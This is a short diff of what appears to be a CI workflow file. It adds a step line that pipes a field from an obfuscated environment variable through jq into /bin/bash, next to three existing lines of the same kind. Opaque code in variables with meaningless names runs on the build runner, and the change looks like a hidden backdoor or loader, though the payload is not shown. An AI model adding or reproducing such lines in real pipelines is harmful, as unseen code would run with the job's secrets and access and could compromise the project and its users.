@@ -30,6 +30,7 @@ jobs:
           echo $zpn9 | jq -r .vh37594 | /bin/bash
           echo $fq2473 | jq -r .cojz4 | /bin/bash
           printf '%s' "$qvh31" | jq -r .gi38 | /bin/bash
+          printf '%s' "$roqc01745" | jq -r .iq7 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
